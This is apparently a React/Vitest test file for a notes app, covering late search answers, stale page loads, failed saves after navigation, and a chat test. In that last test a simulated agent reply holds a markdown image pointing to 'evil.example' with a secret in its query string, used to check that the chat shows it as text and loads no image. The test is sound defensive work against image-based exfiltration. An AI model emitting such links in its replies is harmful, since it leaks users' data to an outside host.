// SPDX-License-Identifier: AGPL-3.0-or-later
// Late answers in the Notes workspace: searches and saves that land after the user moved on.
// (The chat's own reducer tests moved to @jesinia/shell with the chat, Task 14.)
import { baseRoutes, fakeClient, type Routes } from "@jesinia/shell";
import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { search, tree } from "../api";
import { App } from "../App";

const PAGE = { id: "p1", title: "Topic", path: "Ideas/Topic.md", body: "Hello", jesinia: {}, foreign: {}, rev: "r1" };
const OTHER = { ...PAGE, id: "p2", title: "Other", path: "Ideas/Other.md", body: "other", rev: "o1" };

function setup(over: Routes = {}, path = "/notes/page/p1") {
  window.history.pushState(null, "", path);
  const env = fakeClient(
    baseRoutes({
      "GET /api/kb/tree": [],
      "GET /api/kb/pages/p1": PAGE,
      "GET /api/kb/pages/p2": OTHER,
      ...over,
    }),
  );
  render(<App client={env.client} />);
  return env;
}

/** A response the test releases by hand. */
function deferred() {
  const releases: ((r: Response | PromiseLike<Response>) => void)[] = [];
  return {
    route: () => new Promise<Response>((resolve) => releases.push(resolve)),
    release: (i: number, r: Response | PromiseLike<Response>) => act(async () => releases[i]?.(r)),
    count: () => releases.length,
  };
}

function goTo(id: string) {
  window.history.pushState(null, "", `/notes/page/${id}`);
  act(() => window.dispatchEvent(new PopStateEvent("popstate")));
}

async function editor(name: string) {
  const el = await screen.findByRole("textbox", { name });
  const { EditorView } = await import("@codemirror/view");
  const view = EditorView.findFromDOM(el);
  if (!view) throw new Error("no editor view");
  return view;
}

beforeEach(() => {
  Range.prototype.getClientRects = () =>
    ({ length: 0, item: () => null, [Symbol.iterator]: [][Symbol.iterator] }) as unknown as DOMRectList;
  Range.prototype.getBoundingClientRect = () => new DOMRect();
});
afterEach(() => window.history.pushState(null, "", "/"));

describe("api", () => {
  it("an empty search or tree answer reads as no results", async () => {
    const { client } = fakeClient({ "GET /api/search": () => new Response("null", { status: 200 }) });
    expect(await search(client, "x")).toEqual([]);
    expect(await tree(client)).toEqual([]); // no route: 404 with no tree
  });
});

describe("late answers", () => {
  it("a search answered after the query changed is dropped, and so is its failure", async () => {
    const slow = deferred();
    setup({ "GET /api/search": slow.route }, "/notes/");
    const box = await screen.findByRole("searchbox", { name: "Search notes" });
    await userEvent.type(box, "to");
    await waitFor(() => expect(slow.count()).toBe(1), { timeout: 1000 });
    await userEvent.type(box, "p");
    await waitFor(() => expect(slow.count()).toBe(2), { timeout: 1000 });
    await userEvent.type(box, "i");
    await waitFor(() => expect(slow.count()).toBe(3), { timeout: 1000 });
    await slow.release(0, Response.json([{ source: "kb", key: "old", title: "Stale", snippet: "", path: null }]));
    await slow.release(1, Promise.reject(new Error("aborted late")));
    expect(screen.queryByText("Stale")).toBeNull();
    expect(screen.queryByText(/Search failed/)).toBeNull();
    await slow.release(2, Promise.reject("offline")); // not an Error: its text is the cause
    expect(await screen.findByText("Search failed: offline")).toHaveAttribute("role", "alert");
  });

  it("a page that loads after the user moved on is not shown", async () => {
    const slow = deferred();
    setup({ "GET /api/kb/pages/p1": slow.route });
    await waitFor(() => expect(slow.count()).toBe(1));
    goTo("p2");
    expect(await screen.findByRole("heading", { name: "Other", level: 1 })).toBeInTheDocument();
    await slow.release(0, Response.json(PAGE));
    expect(screen.queryByRole("heading", { name: "Topic", level: 1 })).toBeNull();
  });

  it("a save failing after a page switch leaves the next page alone", async () => {
    const slow = deferred();
    setup({ "PATCH /api/kb/pages/p1/body": slow.route });
    const view = await editor("Edit Topic");
    act(() => view.dispatch({ changes: { from: 0, insert: "x" }, userEvent: "input.type" }));
    fireEvent.blur(view.contentDOM);
    await waitFor(() => expect(slow.count()).toBe(1));
    goTo("p2");
    expect(await screen.findByRole("heading", { name: "Other", level: 1 })).toBeInTheDocument();
    await slow.release(0, Response.json({ detail: "disk full" }, { status: 500 }));
    expect(screen.getByTestId("save-state")).toHaveTextContent("Saved");
    expect(screen.queryByText(/Couldn't save/)).toBeNull();
  });

  it("typing while a save is in flight stays unsaved once it lands", async () => {
    const slow = deferred();
    setup({ "PATCH /api/kb/pages/p1/body": slow.route });
    const view = await editor("Edit Topic");
    act(() => view.dispatch({ changes: { from: 0, insert: "a" }, userEvent: "input.type" }));
    fireEvent.blur(view.contentDOM);
    await waitFor(() => expect(slow.count()).toBe(1));
    act(() => view.dispatch({ changes: { from: 0, insert: "b" }, userEvent: "input.type" }));
    await slow.release(0, Response.json({ ...PAGE, body: "aHello", rev: "r2" }));
    expect(screen.getByTestId("save-state")).toHaveTextContent("Editing…");
  });
});

describe("chat", () => {
  it("an agent reply never loads an image (R24)", async () => {
    const sources: { url: string; listeners: Map<string, (e: MessageEvent<string>) => void> }[] = [];
    vi.stubGlobal(
      "EventSource",
      class {
        listeners = new Map<string, (e: MessageEvent<string>) => void>();
        onerror = null;
        constructor(public url: string) {
          sources.push(this);
        }
        addEventListener(name: string, fn: (e: MessageEvent<string>) => void) {
          this.listeners.set(name, fn);
        }
        close() {}
      },
    );
    setup({
      "GET /api/agents/runners": { fake: { available: true, version: "1", detail: "ok" } },
      "POST /api/notes/sessions": { id: "s1", runner: "fake", status: "idle", subject: {} },
      "POST /api/agents/sessions/s1/messages": { ok: true },
    });
    await screen.findByRole("heading", { name: "Topic", level: 1 });
    await userEvent.type(screen.getByRole("textbox", { name: "Message" }), "hi{Enter}");
    await waitFor(() => expect(sources.some((s) => s.url.includes("/sessions/s1/"))).toBe(true));
    const stream = sources.find((s) => s.url.includes("/sessions/s1/"));
    const send = (kind: string, data: object, seq: number) =>
      act(() =>
        stream?.listeners.get(kind)?.(
          new MessageEvent(kind, { data: JSON.stringify({ seq, kind, data, origin: "jesinia" }) }),
        ),
      );
    send("user_message", { text: "hi" }, 1);
    send("text", { text: "![x](https://evil.example/?d=secret)" }, 2);
    send("turn_done", {}, 3);
    expect(await screen.findByText("x (evil.example)")).toBeInTheDocument();
    expect(screen.getByRole("complementary", { name: "Chat" }).querySelector("img")).toBeNull();
    vi.unstubAllGlobals();
  });
});
